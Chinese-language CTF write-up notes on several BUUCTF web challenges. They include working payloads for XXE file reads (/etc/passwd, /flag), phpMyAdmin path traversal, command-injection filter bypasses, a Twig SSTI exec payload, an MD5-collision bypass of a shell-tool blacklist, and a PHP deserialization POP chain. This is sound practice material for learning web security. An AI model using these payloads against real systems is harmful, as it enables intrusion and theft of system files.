

## [NCTF2019]Fake XML cookbook

###### xml外部实体注入

**XXE漏洞全称XML External Entity Injection 即XML外部实体注入。**

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

**XXE常见利用方式**

与SQL相似，XXE漏洞也分为有回显和无回显

有回显，可以直接在页面中看到payload的执行结果或现象。

无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。

解析xml在php库libxml，libxml>=2.9.0的版本中没有XXE漏洞。



做题思路：

构造下列实体可以读取根目录下的flag：

```xml
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE test [
    <!ENTITY admin SYSTEM "file:///flag">
]>

<user><username>&admin;</username><password>123456</password></user>
```

构造实体，注意&admin;

![image-20231120152223677](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231120152223677.png)

中间记得空行：

///etc/passwd可以读取系统用户配置文件（系统中所有用户的基本信息）

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///etc/passwd">
  ]>

<user><username>&admin;</username><password>123456</password></user>
```

![image-20231120152742427](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231120152742427.png)



## [GWCTF 2019]我有一个数据库

扫描可以得到/phpmyadmin路径

打开得到后台界面

###### phpMyAdmin4.8.1文件包含漏洞：

```
http://c6343f83-b9a9-4a2e-899d-0fb98cf8fedd.node4.buuoj.cn:81/phpmyadmin/?target=db_structure.php%253f/../../../../../../../../etc/passwd
```

```
http://c6343f83-b9a9-4a2e-899d-0fb98cf8fedd.node4.buuoj.cn:81/phpmyadmin/?target=db_structure.php%253f/../../../../../../../../flag
```



## [BJDCTF2020]Mark loves cat

访问/.git发现有git泄露

在flag.php文件中有：

```php
<?php

$flag = file_get_contents('/flag');
```

并得到文件包含文件：

###### 文件包含（代码审计）

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;
```

两种做法：

```
http://09cf839c-1337-4094-9021-e8e43fc6296e.node4.buuoj.cn:81/index.php?yds=flag
```

```
http://09cf839c-1337-4094-9021-e8e43fc6296e.node4.buuoj.cn:81/index.php?is=flag&&flag=flag
```



## [WUSTCTF2020]朴实无华

借助robots.txt的提示访问到/fAke_f1agggg.php

得到fake flag：flag{this_is_not_flag}

bp抓包，返回包提示Look_at_me: /fl4g.php

得到：

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

###### intval绕过＋基本绕过

第一层：100e2绕过intval

第二层：md5值等于自身的数

第三层：ca\t 替换cat  ${IFS}或者$IFS$1替换空格

```
http://28a4a578-2a42-405d-afc0-5acc7ed00dc1.node4.buuoj.cn:81/fl4g.php?num=100e2&&md5=0e215962017&&get_flag=ls
```

```
http://28a4a578-2a42-405d-afc0-5acc7ed00dc1.node4.buuoj.cn:81/fl4g.php?num=100e2&&md5=0e215962017&&get_flag=ca\t${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```



## [BJDCTF2020]Cookie is so stable

###### ssti漏洞改cookie值

登陆之后修改cookie

尝试{{7*7}}后发现有ssti漏洞

payload:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```



## [安洵杯 2019]easy_web

###### 编码＋php绕过

```
http://5aa0db3e-e8c6-46f3-9c7f-ce87012fe032.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

img通过Hex编码＋两次base64编码得到

解码TXpVek5UTTFNbVUzTURabE5qYz0后得到555.png

对index.php进行加密传入得到源码：

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

```

(string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])

a,b字符串不同，但是a,b的md5值相同：

a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

###### 不能直接将get改为post

需要加入

```
Content-Type:application/x-www-form-urlencoded
```



## [MRCTF2020]Ezpop

###### php反序列化

```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

第一：获取 flag 存储 flag.php

第二：四个魔术方法__invoke__construct__toString__wakeup__get

第三：传输 pop参数数据后触发 __wakeup，对该类中的 this->source参数若为字符串则对其进行过滤，若source变量为一个类则触发__toString

第四：__toString 会调用this->str变量，当str变量为Test类的时候，将触发__get

第四：__get会return $function方法，当给Test类中的p变量赋值为Modifier类时候，会触发__invoke

第四：__invoke会执行append()方法，从而执行文件包含，注意var变量为protected类型，需要对变量进行base64编码

第五：涉及对象 Modifier，Show，Test，变量 op 及 var，source,str，p，进行构造输出

###### 触发__tostring的具体场景：

> (1)  echo($obj) / print($obj) 打印时会触发
>
> (2) 反序列化对象与字符串连接时
>
> (3) 反序列化对象参与格式化字符串时
>
> (4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
>
> (5) 反序列化对象参与格式化SQL语句，绑定参数时
>
> (6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
>
> (7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用
>
> (8) 反序列化的对象作为 class_exists() 的参数的时候

```php
Welcome to index.php

<?php
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';
    public function append($value){
        include($value);
    }
    public function __invoke(){
        //当对象作为函数时调用4
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){//类被当成字符串时2
        return $this->str->source;
    }

    public function __wakeup(){//反序列化之后调用1
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){//访问一个对象的不可访问或不存在属性时调用3
        $function = $this->p;
        return $function();
    }
}

//pop链
//Get传入反序列化pop
//反序列化->触发show函数中的__wakeup->过正则匹配 防止设置 $this->source = "index.php"
//source为类，触发__toString->return $this->str->source;
//str为Test，访问Test中的source访问不到，触发__get；
//$function = $this->p;  return $function();
//p设置为Modifier，触发__invoke->调用append($this->var)
//protected  $var;将var提供base64传入

$show=new Show();
$show->source=new Show();
$show->source->str=new Test();
$show->source->str->p=new Modifier();

print(urlencode(serialize($show)));

?>
```

```
http://42f96042-8bda-4ad2-8e97-4b63de786209.node4.buuoj.cn:81/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```



## [强网杯 2019]高明的黑客

访问www.tar.gz得到源代码文件

![image-20231127161545468](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231127161545468.png)

下载出来3000个php文件

![image-20231127161711251](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231127161711251.png)

随意打开可以看到很多一句话木马

![image-20231127161800622](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231127161800622.png)

应该是不是所有都能用的

###### 【待写】写脚本把所有的遍历一遍



## [安洵杯 2019]easy_serialize_php

直接看到了源码信息，感觉就是代码审计：

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

先根据题目提示访问phpinfo()

得到flag的文件名 d0g3_f1ag.php

![image-20231127204038999](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231127204038999.png)

[[CTF\][安洵杯 2019]easy_serialize_php 1 -- 反序列化漏洞、反序列化字符逃逸_easyseri ctf_Gh0st_1n_The_shell的博客-CSDN博客](https://blog.csdn.net/weixin_45841815/article/details/119934050)

[[安洵杯 2019\]easy_serialize_php 1_hcjtn的博客-CSDN博客](https://blog.csdn.net/m0_62879498/article/details/124644325)

并不是看得很懂。。。呜呜呜

**直接改userinfo[‘img’]**
反序列化字符逃逸的两种方法：键值逃逸，键名逃逸

最后post的值为_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}



**利用方法**

###### 反序列化字符逃逸

代码会将userinfo中的[‘img’]值做base64解码，然后吧提到的整个文件读入一个字符串中，所以我们就要构造img的值，让代码读出内容，经过上文的分析，想要修改img的值可以通过设置img_path，或者修改userinfo[‘img’]的内容

首先看修改img_path
这个方法有一个问题，修改img_path，传入的内容会被base64和sha1加密$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));，然而，高亮文件内容时只做了base64的解密，所以修改img_path是无法读到文件的，所以只能修改userinfo[‘img’]的内容

userinfo[‘img’]的内容由_SESSION组成，所以我们可以修改user和function，考虑到有过滤，可以采用反序列化字符逃逸来构造SESSION[‘img’]的值
首先_SESSION一共有三个键值对，所以我们一共要构建三个键值对，反序列化字符逃逸的原理比较好理解，就是在构造键值的时候故意构造出会被过滤的的值，然后会被过滤函数给过滤掉，但是序列化后的字符串记录的值的长度却不会因为被过滤后而改变，所以就会把序列化后的字符串的结构当做值的内容给读取，如果我们自己构造出反序列化字符串的结构，并因为过滤破坏掉原来的结构，就可以构造出恶意代码，下面根据题目详细解释
反序列化字符逃逸一共有两种方法：一个是键值逃逸，另一个是键名逃逸